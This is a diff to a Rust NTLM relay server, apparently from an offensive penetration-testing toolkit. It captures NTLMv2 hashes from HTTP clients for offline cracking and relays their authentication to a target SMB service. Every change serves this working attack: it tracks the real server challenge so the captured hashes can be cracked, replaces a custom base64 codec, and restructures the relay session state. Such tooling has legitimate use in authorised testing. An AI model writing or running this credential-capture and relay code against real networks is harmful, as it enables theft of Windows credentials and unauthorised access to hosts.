@@ -4,6 +4,7 @@
 //! to a target SMB/HTTP service. Captures NTLMv2 hashes for offline cracking.
 
 use anyhow::Result;
+use base64::prelude::*;
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
 use tokio::net::{TcpListener, TcpStream};
 use tracing::{debug, error, info, warn};
@@ -88,7 +89,9 @@ impl RelayServer {
             let relay_target = self.config.relay_target.clone();
 
             tokio::spawn(async move {
-                if let Err(e) = handle_http_ntlm(socket, &client_ip, captured, capture_only, relay_target).await {
+                if let Err(e) =
+                    handle_http_ntlm(socket, &client_ip, captured, capture_only, relay_target).await
+                {
                     debug!("Relay: Connection handler error for {addr}: {e}");
                 }
             });
@@ -97,6 +100,13 @@ impl RelayServer {
 }
 
 /// Handle a single HTTP connection, triggering NTLM auth via 401 challenges.
+/// Encapsulates the connection state for a relay session
+struct RelaySession {
+    stream: Option<TcpStream>,
+    session_id: u64,
+    challenge: Option<[u8; 8]>,
+}
+
 async fn handle_http_ntlm(
     mut stream: TcpStream,
     client_ip: &str,
@@ -104,9 +114,8 @@ async fn handle_http_ntlm(
     capture_only: bool,
     relay_target: Option<String>,
 ) -> Result<()> {
-    let mut relay_stream: Option<TcpStream> = None;
     let timeout = std::time::Duration::from_secs(10);
-    let mut session_id: u64 = 0;
+    let mut relay_session = RelaySession { stream: None, session_id: 0, challenge: None };
 
     let (reader, mut writer) = stream.split();
     let mut buf_reader = BufReader::new(reader);
@@ -146,7 +155,7 @@ async fn handle_http_ntlm(
             }
             Some(auth) if auth.starts_with("NTLM ") => {
                 let b64_data = &auth[5..];
-                match base64_decode(b64_data) {
+                match BASE64_STANDARD.decode(b64_data) {
                     Ok(ntlm_bytes) => {
                         if ntlm_bytes.len() < 12 {
                             warn!("Relay: NTLM message too short from {client_ip}");
@@ -165,48 +174,82 @@ async fn handle_http_ntlm(
                             1 => {
                                 // Type 1 (Negotiate) → respond with Type 2 (Challenge)
                                 let challenge_bytes = if !capture_only && relay_target.is_some() {
-                                    let target = relay_target.as_ref().unwrap_or(&String::new()).to_owned();
+                                    let target =
+                                        relay_target.as_ref().unwrap_or(&String::new()).to_owned();
                                     // Parse target host and port
                                     let mut parts = target.split(':');
                                     let host = parts.next().unwrap_or(&target);
-                                    let port = parts.next().and_then(|p| p.parse::<u16>().ok()).unwrap_or(445);
+                                    let port = parts
+                                        .next()
+                                        .and_then(|p| p.parse::<u16>().ok())
+                                        .unwrap_or(445);
 
-                                    debug!("Relay: Connecting to SMB relay target {}:{}", host, port);
+                                    debug!(
+                                        "Relay: Connecting to SMB relay target {}:{}",
+                                        host, port
+                                    );
                                     match TcpStream::connect((host, port)).await {
                                         Ok(mut smb_stream) => {
                                             // Send Negotiate
-                                            if let Err(e) = nxc_protocols::smb::SmbProtocol::negotiate(&mut smb_stream, timeout).await {
+                                            if let Err(e) =
+                                                nxc_protocols::smb::SmbProtocol::negotiate(
+                                                    &mut smb_stream,
+                                                    timeout,
+                                                )
+                                                .await
+                                            {
                                                 warn!("Relay: Failed to negotiate SMB with {target}: {e}");
-                                                build_ntlm_type2_challenge()
+                                                {
+                                                    let (msg, challenge) =
+                                                        build_ntlm_type2_challenge();
+                                                    relay_session.challenge = Some(challenge);
+                                                    msg
+                                                }
                                             } else {
                                                 // Send SESSION_SETUP with Type 1 to extract Challenge
                                                 let proto = nxc_protocols::smb::SmbProtocol::new();
                                                 let mut pkt = proto.build_session_setup_base();
-                                                pkt[78..80].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
+                                                pkt[78..80].copy_from_slice(
+                                                    &(ntlm_bytes.len() as u16).to_le_bytes(),
+                                                );
                                                 pkt.extend_from_slice(&ntlm_bytes);
 
                                                 if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
                                                     warn!("Relay: Failed to send SESSION_SETUP to {target}: {e}");
-                                                    build_ntlm_type2_challenge()
+                                                    {
+                                                                let (msg, challenge) = build_ntlm_type2_challenge();
+                                                                relay_session.challenge = Some(challenge);
+                                                                msg
+                                                            }
                                                 } else {
                                                     match nxc_protocols::smb::SmbProtocol::recv_smb2_packet(&mut smb_stream, timeout).await {
                                                         Ok(resp) => {
                                                             // Extract NTLM blob from SESSION_SETUP response
                                                             let signature = b"NTLMSSP\0\x02\x00\x00\x00";
                                                             if let Some(pos) = resp.windows(signature.len()).position(|w| w == signature) {
-                                                                relay_stream = Some(smb_stream);
+                                                                relay_session.stream = Some(smb_stream);
                                                                 if resp.len() >= 48 {
-                                                                    session_id = u64::from_le_bytes(resp[40..48].try_into().unwrap_or([0; 8]));
+                                                                    relay_session.session_id = u64::from_le_bytes(resp[40..48].try_into().unwrap_or([0; 8]));
                                                                 }
-                                                                resp[pos..].to_vec()
+                                                                let ntlm_blob = resp[pos..].to_vec();
+                                                                if ntlm_blob.len() >= 32 {
+                                                                    relay_session.challenge = Some(ntlm_blob[24..32].try_into().unwrap_or([0; 8]));
+                                                                }
+                                                                ntlm_blob
                                                             } else {
                                                                 warn!("Relay: No NTLM Type 2 found in SMB response from {target}");
-                                                                build_ntlm_type2_challenge()
+                                                                let (msg, challenge) = build_ntlm_type2_challenge();
+                                                                relay_session.challenge = Some(challenge);
+                                                                msg
                                                             }
                                                         }
                                                         Err(e) => {
                                                             warn!("Relay: Failed to receive SESSION_SETUP response from {target}: {e}");
-                                                            build_ntlm_type2_challenge()
+                                                            {
+                                                                let (msg, challenge) = build_ntlm_type2_challenge();
+                                                                relay_session.challenge = Some(challenge);
+                                                                msg
+                                                            }
                                                         }
                                                     }
                                                 }
@@ -214,15 +257,23 @@ async fn handle_http_ntlm(
                                         }
                                         Err(e) => {
                                             warn!("Relay: Failed to connect to relay target {target}: {e}");
-                                            build_ntlm_type2_challenge()
+                                            {
+                                                let (msg, challenge) = build_ntlm_type2_challenge();
+                                                relay_session.challenge = Some(challenge);
+                                                msg
+                                            }
                                         }
                                     }
                                 } else {
                                     debug!("Relay: NTLM Type 1 from {client_ip} — sending dummy Type 2 challenge (capture only)");
-                                    build_ntlm_type2_challenge()
+                                    {
+                                        let (msg, challenge) = build_ntlm_type2_challenge();
+                                        relay_session.challenge = Some(challenge);
+                                        msg
+                                    }
                                 };
 
-                                let b64_challenge = base64_encode(&challenge_bytes);
+                                let b64_challenge = BASE64_STANDARD.encode(&challenge_bytes);
                                 let response = format!(
                                     "HTTP/1.1 401 Unauthorized\r\n\
                                      WWW-Authenticate: NTLM {b64_challenge}\r\n\
@@ -235,7 +286,8 @@ async fn handle_http_ntlm(
                             3 => {
                                 // Type 3 (Authenticate) → extract credentials
                                 debug!("Relay: NTLM Type 3 from {client_ip} — extracting hash");
-                                match extract_type3_info(&ntlm_bytes) {
+                                let challenge = relay_session.challenge.unwrap_or([0; 8]);
+                                match extract_type3_info(&ntlm_bytes, challenge) {
                                     Ok((username, domain, hash_str)) => {
                                         let hash = CapturedHash {
                                             client_ip: client_ip.to_string(),
@@ -255,11 +307,18 @@ async fn handle_http_ntlm(
                                         if !capture_only {
                                             if let Some(ref target) = relay_target {
                                                 info!("Relay: Connecting to target {target} to relay authentication...");
-                                                if let Some(mut smb_stream) = relay_stream.take() {
-                                                    let proto = nxc_protocols::smb::SmbProtocol::new();
+                                                if let Some(mut smb_stream) =
+                                                    relay_session.stream.take()
+                                                {
+                                                    let proto =
+                                                        nxc_protocols::smb::SmbProtocol::new();
                                                     let mut pkt = proto.build_session_setup_base();
-                                                    pkt[40..48].copy_from_slice(&session_id.to_le_bytes());
-                                                    pkt[78..80].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
+                                                    pkt[40..48].copy_from_slice(
+                                                        &relay_session.session_id.to_le_bytes(),
+                                                    );
+                                                    pkt[78..80].copy_from_slice(
+                                                        &(ntlm_bytes.len() as u16).to_le_bytes(),
+                                                    );
                                                     pkt.extend_from_slice(&ntlm_bytes);
 
                                                     if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
@@ -287,7 +346,9 @@ async fn handle_http_ntlm(
                                         writer.write_all(response.as_bytes()).await?;
                                     }
                                     Err(e) => {
-                                        error!("Relay: Failed to parse Type 3 from {client_ip}: {e}");
+                                        error!(
+                                            "Relay: Failed to parse Type 3 from {client_ip}: {e}"
+                                        );
                                         send_401_ntlm(&mut writer).await?;
                                     }
                                 }
@@ -330,7 +391,7 @@ async fn send_401_ntlm<W: tokio::io::AsyncWrite + Unpin>(writer: &mut W) -> Resu
 ///
 /// This is a simplified challenge with a fixed server nonce.
 /// In a real relay scenario, this challenge would be forwarded from the target.
-fn build_ntlm_type2_challenge() -> Vec<u8> {
+fn build_ntlm_type2_challenge() -> (Vec<u8>, [u8; 8]) {
     let mut msg = Vec::with_capacity(56);
 
     // Signature: "NTLMSSP\0"
@@ -349,7 +410,8 @@ fn build_ntlm_type2_challenge() -> Vec<u8> {
         | 0x40000000; // KEY_EXCH
     msg.extend_from_slice(&flags.to_le_bytes());
     // Server Challenge (8 bytes)
-    msg.extend_from_slice(&rand::random::<[u8; 8]>());
+    let challenge = rand::random::<[u8; 8]>();
+    msg.extend_from_slice(&challenge);
     // Reserved (8 bytes)
     msg.extend_from_slice(&[0u8; 8]);
     // Target Info (empty security buffer): len=0, maxlen=0, offset=56
@@ -357,11 +419,11 @@ fn build_ntlm_type2_challenge() -> Vec<u8> {
     msg.extend_from_slice(&0u16.to_le_bytes());
     msg.extend_from_slice(&56u32.to_le_bytes());
 
-    msg
+    (msg, challenge)
 }
 
 /// Extract username, domain, and hash string from an NTLM Type 3 message.
-fn extract_type3_info(data: &[u8]) -> Result<(String, String, String)> {
+fn extract_type3_info(data: &[u8], challenge: [u8; 8]) -> Result<(String, String, String)> {
     if data.len() < 72 {
         anyhow::bail!("Type 3 message too short ({} bytes)", data.len());
     }
@@ -399,10 +461,9 @@ fn extract_type3_info(data: &[u8]) -> Result<(String, String, String)> {
         let nt_response = &data[nt_off..nt_off + nt_len];
         let nt_proof = hex::encode(&nt_response[..16]);
         let blob = hex::encode(&nt_response[16..]);
-        // Standard challenge from our Type 2
-        let challenge = "1122334455667788";
         // Format: username::domain:challenge:nt_proof:blob
-        format!("{username}::{domain}:{challenge}:{nt_proof}:{blob}")
+        let challenge_hex = hex::encode(challenge);
+        format!("{username}::{domain}:{challenge_hex}:{nt_proof}:{blob}")
     } else {
         format!("{username}::{domain}:no_nt_response")
     };
@@ -414,63 +475,4 @@ fn extract_type3_info(data: &[u8]) -> Result<(String, String, String)> {
 fn decode_utf16le(data: &[u8]) -> String {
     let u16s: Vec<u16> = data.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
     String::from_utf16_lossy(&u16s)
-}
-
-/// Simple base64 decode (no external dependency needed — use built-in).
-fn base64_decode(input: &str) -> Result<Vec<u8>> {
-    // Minimal base64 decoder for NTLM tokens
-    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-    let input = input.trim();
-    let mut output = Vec::with_capacity(input.len() * 3 / 4);
-    let mut buf: u32 = 0;
-    let mut bits: u32 = 0;
-
-    for &b in input.as_bytes() {
-        if b == b'=' {
-            break;
-        }
-        let val = CHARS.iter().position(|&c| c == b);
-        let val = match val {
-            Some(v) => v as u32,
-            None => continue, // skip whitespace
-        };
-        buf = (buf << 6) | val;
-        bits += 6;
-        if bits >= 8 {
-            bits -= 8;
-            output.push((buf >> bits) as u8);
-            buf &= (1 << bits) - 1;
-        }
-    }
-
-    Ok(output)
-}
-
-/// Simple base64 encode.
-fn base64_encode(input: &[u8]) -> String {
-    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    let mut result = String::with_capacity(input.len().div_ceil(3) * 4);
-
-    for chunk in input.chunks(3) {
-        let b0 = chunk[0] as u32;
-        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
-        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
-        let triple = (b0 << 16) | (b1 << 8) | b2;
-
-        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
-        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
-        if chunk.len() > 1 {
-            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
-        } else {
-            result.push('=');
-        }
-        if chunk.len() > 2 {
-            result.push(CHARS[(triple & 0x3F) as usize] as char);
-        } else {
-            result.push('=');
-        }
-    }
-
-    result
 }
